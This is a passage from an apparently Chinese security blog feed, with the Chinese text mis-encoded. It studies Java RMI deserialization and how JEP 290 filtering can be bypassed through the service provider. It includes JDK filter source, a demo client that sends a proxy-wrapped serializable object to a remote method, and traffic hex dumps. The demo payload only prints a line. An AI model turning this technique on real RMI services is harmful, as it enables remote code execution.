class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ObjectInputFilter registryFilter =</span><br><span class="line">            AccessController.doPrivileged((PrivilegedAction&lt;ObjectInputFilter&gt;)RegistryImpl::initRegistryFilter);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Initialize the registryFilter from the security properties or system property; if any</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> an ObjectInputFilter, or null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter <span class="title">initRegistryFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ObjectInputFilter filter = <span class="keyword">null</span>;</span><br><span class="line">    String props = System.getProperty(REGISTRY_FILTER_PROPNAME);</span><br><span class="line">    <span class="keyword">if</span> (props == <span class="keyword">null</span>) &#123;</span><br><span class="line">        props = Security.getProperty(REGISTRY_FILTER_PROPNAME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (props != <span class="keyword">null</span>) &#123;</span><br><span class="line">        filter = SharedSecrets.getJavaObjectInputFilterAccess().createFilter2(props);</span><br><span class="line">        Log regLog = Log.getLog(<span class="string">"sun.rmi.registry"</span>, <span class="string">"registry"</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (regLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            regLog.log(Log.BRIEF, <span class="string">"registryFilter = "</span> + filter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter.<span class="function">Status <span class="title">registryFilter</span><span class="params">(ObjectInputFilter.FilterInfo filterInfo)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (registryFilter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ObjectInputFilter.Status status = registryFilter.checkInput(filterInfo);</span><br><span class="line">        <span class="keyword">if</span> (status != ObjectInputFilter.Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="comment">// The Registry filter can override the built-in white-list</span></span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterInfo.depth() &gt; REGISTRY_MAX_DEPTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.isArray()) &#123;</span><br><span class="line">            <span class="comment">// Arrays are REJECTED only if they exceed the limit</span></span><br><span class="line">            <span class="keyword">return</span> (filterInfo.arrayLength() &gt;= <span class="number">0</span> &amp;&amp; filterInfo.arrayLength() &gt; REGISTRY_MAX_ARRAY_SIZE)</span><br><span class="line">                ? ObjectInputFilter.Status.REJECTED</span><br><span class="line">                : ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (String.class == clazz</span><br><span class="line">                || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">                || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">                || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RegistryImpl</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// grant permission for default port only.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">                    LiveRef lref = <span class="keyword">new</span> LiveRef(id, port);</span><br><span class="line">                    setup(<span class="keyword">new</span> UnicastServerRef(lref, RegistryImpl::registryFilter));</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="keyword">null</span>, <span class="keyword">new</span> SocketPermission(<span class="string">"localhost:"</span>+port, <span class="string">"listen,accept"</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RemoteException)pae.getException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LiveRef lref = <span class="keyword">new</span> LiveRef(id, port);</span><br><span class="line">        setup(<span class="keyword">new</span> UnicastServerRef(lref, RegistryImpl::registryFilter)); <span class="comment">// è¿™ä¸€è¡Œ, å°†è¿‡æ»¤å™¨ä¼ ç»™äº† UnicastServerRef</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„æœ‰ä¸¤ä¸ª registryFilter, ä¸€ä¸ªæ˜¯é™æ€å‡½æ•°, ä¸€ä¸ªæ˜¯é™æ€å¯¹è±¡.<br>é™æ€å¯¹è±¡åœ¨ç±»å®šä¹‰æ—¶è¢«èµ‹å€¼, registryFilter é™æ€å‡½æ•°åœ¨å‡½æ•°ä½“é‡Œé¢è°ƒç”¨äº† registryFilter å¯¹è±¡æ¥æ£€æŸ¥.  </p><p>å…¶ä¸­ registryFilter å¯¹è±¡æ¥æºåº”è¯¥å°±æ˜¯ä» JEP 290 åŠ çš„å±æ€§ jdk.serialFilter é‡Œé¢è¯»å–è¿‡æ»¤è§„åˆ™. å› ä¸º ObjectInputStream é‡Œé¢åªèƒ½è®¾ç½®ä¸€ä¸ª ObjectInputFilter. å¦‚æœè¦è‡ªå®šä¹‰, å°±åªèƒ½å…ˆè¯»å–åŸæ¥çš„, ç„¶ååœ¨è‡ªå·±æ–°å®šä¹‰çš„ filter ä¸­è°ƒç”¨åŸæ¥çš„. å¦åˆ™åŸæ¥çš„è§„åˆ™å°±æ²¡äº†, æ‰€ä»¥åº•ä¸‹çš„å°±æ˜¯ RMI çœŸæ­£æ–°å¢çš„è¿‡æ»¤.  </p><p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤è§„åˆ™ä¸»è¦å°±æ˜¯: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (String.class == clazz</span><br><span class="line">        || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">        || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">        || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">        || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">        || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥äº†ååºåˆ—åŒ–å¯¹è±¡æ˜¯å¦æ˜¯ <code>String</code> æˆ–è€…æ˜¯ <code>Number</code>, <code>Remote</code>, <code>Proxy</code>, <code>UnicastRef</code>, <code>RMIClientSocketFactory</code>, <code>RMIServerSocketFactory</code>, <code>ActivationID</code>, <code>UID</code> çš„å­ç±», å¦åˆ™å°±æ‹’ç»ååºåˆ—åŒ–, å¯ä»¥çœ‹åˆ°æ˜¯ç™½åå•, è¿˜æ˜¯æŒºé è°±çš„. ä¹Ÿç¡®å®æ•ˆæœæŒºå¥½, èƒ½ bypass çš„ä¹Ÿåªæœ‰ JRMPClient.  </p><p>ä¸è¿‡è¿™åªå¯¹ bind ç­‰æ“ä½œç”Ÿæ•ˆ. å› ä¸ºåœ¨çœŸæ­£è°ƒç”¨è¿œç¨‹å¯¹è±¡æ—¶, å¤„ç†å‡½æ•°è°ƒç”¨çš„æ˜¯ Service Provider è€Œä¸æ˜¯ Registry. Registry æ˜¯ RegistryImpl, è€Œ Service Provider å¾—åˆ°çš„æ˜¯ RegistryImpl_Stub. å…¶åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯æ²¡æœ‰ filter çš„,  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RegistryImpl_Stub</span><span class="params">(java.rmi.server.RemoteRef ref)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯ JEP-290 èƒ½è¢«ç»•è¿‡çš„åŸå› . å…¶åªå¯¹ Registry åšäº†é˜²æŠ¤, è€Œ Service Provider ä¹Ÿä¼šè¿›è¡Œååºåˆ—åŒ–, å´æ²¡æœ‰åšååºåˆ—åŒ–çš„é˜²æŠ¤.<br>å½“ç„¶, Service Provider ç¡®å®æ— æ³•è¿›è¡Œç™½åå•å±‚é¢çš„é˜²æŠ¤, å› ä¸ºå‡½æ•°çš„å‚æ•°ç±»å‹æ˜¯å„ç§å„æ ·çš„, ä¼°è®¡ä¹Ÿæ˜¯å‡ºäºå¯¹å…¼å®¹æ€§å’Œé»‘åå•è¢«ç»•è¿‡çš„è€ƒè™‘, ä¹Ÿæ²¡è¿›è¡Œé»‘åå•é˜²æŠ¤.</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p>[1] <a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a><br>[2] <a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å®˜ç½‘ä»‹ç»: &lt;a href=&quot;https://openjdk.java.net/jeps/290&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://openjdk.java.net/jeps/290&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;JEP = JDK Enhancement Proposals&lt;br&gt;å°±æ˜¯ç­‰äºæ”¹è¿›ææ¡ˆ.  python ä¹Ÿæœ‰ç±»ä¼¼çš„, å°±æ˜¯å¤§å®¶å–œé—»ä¹è§çš„ PEP (Python Enhancement Proposals).  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>JAVA JNDI / RMI å­¦ä¹ </title>
    <link href="https://rmb122.com/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/"/>
    <id>https://rmb122.com/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-02-04T14:39:58.000Z</published>
    <updated>2020-05-29T04:35:04.112Z</updated>
    
    <content type="html"><![CDATA[<p>RMI / JNDI åœ¨ååºåˆ—åŒ–, fastjson æ¼æ´åˆ©ç”¨çš„æ—¶å€™éƒ½ç»å¸¸å‡ºç°, å­¦ä¹ ä¸€ä¸‹.</p><a id="more"></a><h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>ç›—ä¸€å¼ å›¾  </p><p><img src="https://i.loli.net/2020/02/19/pMiX4BNVRzeadD6.png" alt="1.png"></p><p>åŠ ä¸Šä¸€äº›ç¤ºä¾‹,  </p><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry reg = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIServiceProvider.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServiceProvider</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line">        TestObjectImpl obj = <span class="keyword">new</span> TestObjectImpl();</span><br><span class="line">        TestObject services = (TestObject) UnicastRemoteObject.exportObject(obj, <span class="number">0</span>);</span><br><span class="line">        registry.bind(<span class="string">"test"</span>, services);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIClient.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteRef;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        DeserializeObject deserializeObject = <span class="keyword">new</span> DeserializeObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;Class.class, Map.class&#125;);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(<span class="string">"aaa"</span>, deserializeObject);</span><br><span class="line">        InvocationHandler obj = (InvocationHandler) constructor.newInstance(Deprecated.class, hashMap);</span><br><span class="line"></span><br><span class="line">        TestObject services = (TestObject) registry.lookup(<span class="string">"test"</span>);</span><br><span class="line">        CharSequence proxy = (CharSequence) Proxy.newProxyInstance(String.class.getClassLoader(), String.class.getInterfaces(), obj);</span><br><span class="line">        services.callMe(proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TestObject</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">callMe</span><span class="params">(Dummy input)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestObjectImpl</span> <span class="keyword">implements</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">callMe</span><span class="params">(Dummy input)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"callMe: "</span> + input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DummyImpl</span> <span class="keyword">implements</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeserializeObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">"DeserializeObject.readObject"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹:  </p><p>RMIServiceProvider è¾“å‡º:<br><img src="https://i.loli.net/2020/02/19/ur2VUMmH5l9IDvz.png" alt="2.png"></p><p>å¤§è‡´ç†è§£èµ·æ¥è¿˜æ˜¯ä¸å¤ªå›°éš¾çš„, å®¢æˆ·ç«¯é€šè¿‡ <code>Registry</code>, è°ƒç”¨ <code>RMIServiceProvider</code> ä¸Šçš„æœåŠ¡.<br>å¯ä»¥çœ‹çœ‹ wireshark çš„æµé‡, æ›´æ¸…æ™°ä¸€äº›.  </p><p>Client &lt;-&gt; Registry ä¹‹é—´çš„æµé‡, ç¼©è¿›çš„æ˜¯æ³¨å†Œå±€å‘ç»™å®¢æˆ·ç«¯çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">00000000  4a 52 4d 49 00 02 4b                               JRMI..K</span><br><span class="line">    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 84 58   N..127.0 .0.1...X</span><br><span class="line">00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....</span><br><span class="line">00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 00 00   P....w&quot;. ........</span><br><span class="line">00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000036  02 44 15 4d c9 d4 e6 3b  df 74 00 04 74 65 73 74   .D.M...; .t..test</span><br><span class="line">    00000010  51 ac ed 00 05 77 0f 01  e8 1f e8 41 00 00 01 70   Q....w.. ...A...p</span><br><span class="line">    00000020  5d a3 bd 51 80 0c 73 7d  00 00 00 01 00 16 64 65   ]..Q..s&#125; ......de</span><br><span class="line">    00000030  6d 6f 2e 72 6d 62 31 32  32 2e 54 65 73 74 4f 62   mo.rmb12 2.TestOb</span><br><span class="line">    00000040  6a 65 63 74 70 78 72 00  17 6a 61 76 61 2e 6c 61   jectpxr. .java.la</span><br><span class="line">    00000050  6e 67 2e 72 65 66 6c 65  63 74 2e 50 72 6f 78 79   ng.refle ct.Proxy</span><br><span class="line">    00000060  e1 27 da 20 cc 10 43 cb  02 00 01 4c 00 01 68 74   .&#39;. ..C. ...L..ht</span><br><span class="line">    00000070  00 25 4c 6a 61 76 61 2f  6c 61 6e 67 2f 72 65 66   .%Ljava&#x2F; lang&#x2F;ref</span><br><span class="line">    00000080  6c 65 63 74 2f 49 6e 76  6f 63 61 74 69 6f 6e 48   lect&#x2F;Inv ocationH</span><br><span class="line">    00000090  61 6e 64 6c 65 72 3b 70  78 70 73 72 00 2d 6a 61   andler;p xpsr.-ja</span><br><span class="line">    000000A0  76 61 2e 72 6d 69 2e 73  65 72 76 65 72 2e 52 65   va.rmi.s erver.Re</span><br><span class="line">    000000B0  6d 6f 74 65 4f 62 6a 65  63 74 49 6e 76 6f 63 61   moteObje ctInvoca</span><br><span class="line">    000000C0  74 69 6f 6e 48 61 6e 64  6c 65 72 00 00 00 00 00   tionHand ler.....</span><br><span class="line">    000000D0  00 00 02 02 00 00 70 78  72 00 1c 6a 61 76 61 2e   ......px r..java.</span><br><span class="line">    000000E0  72 6d 69 2e 73 65 72 76  65 72 2e 52 65 6d 6f 74   rmi.serv er.Remot</span><br><span class="line">    000000F0  65 4f 62 6a 65 63 74 d3  61 b4 91 0c 61 33 1e 03   eObject. a...a3..</span><br><span class="line">    00000100  00 00 70 78 70 77 32 00  0a 55 6e 69 63 61 73 74   ..pxpw2. .Unicast</span><br><span class="line">    00000110  52 65 66 00 09 31 32 37  2e 30 2e 31 2e 31 00 00   Ref..127 .0.1.1..</span><br><span class="line">    00000120  a9 83 27 2e 2f a2 08 49  09 8f ab a0 76 97 00 00   ..&#39;.&#x2F;..I ....v...</span><br><span class="line">    00000130  01 70 5d a6 5c 22 80 01  01 78                     .p].\&quot;.. .x</span><br><span class="line">00000046  52                                                 R</span><br><span class="line">    0000013A  53                                                 S</span><br><span class="line">00000047  54 e8 1f e8 41 00 00 01  70 5d a3 bd 51 80 0c      T...A... p]..Q..</span><br></pre></td></tr></table></figure><p>Client &lt;-&gt; RMIServiceProvider ä¹‹é—´çš„æµé‡, ç¼©è¿›çš„æ˜¯æœåŠ¡æä¾›è€…å‘ç»™å®¢æˆ·ç«¯çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 